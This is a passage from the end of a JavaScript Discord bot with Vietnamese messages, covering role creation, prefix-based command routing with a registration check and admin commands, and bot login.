      return ok(m, `Đã tạo role **${role.name}** và gán cho bạn.`);
    } catch (e) {
      console.error(e);
      return loi(m, 'Không tạo/gán được role. Hãy cấp cho bot quyền **Manage Roles** (hoặc Administrator) và kéo role của bot lên cao hơn.');
    }
  }
}

// ===================== KHỞI ĐỘNG BOT =====================
client.once('clientReady', () => console.log(`Bot đã online: ${client.user.tag}`));

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  const content = message.content.trim();
  const prefix = content[0];
  if (prefix !== '!' && prefix !== '?') return;

  const args = content.slice(1).split(/\s+/);
  const cmd = (args.shift() || '').toLowerCase();

  try {
    if (prefix === '?') return await xuLyAdmin(message, cmd, args);

    const handler = lenh.get(cmd);
    if (!handler) return;
    if (cmd !== 'helptx' && cmd !== 'dangky' && !getUser(message.author.id)) {
      return loi(message, 'Bạn cần dùng `!dangky` trước khi sử dụng các lệnh khác.');
    }
    await handler(message, args);
  } catch (e) {
    console.error('Lỗi xử lý lệnh:', e);
  }
});

client.login(TOKEN);
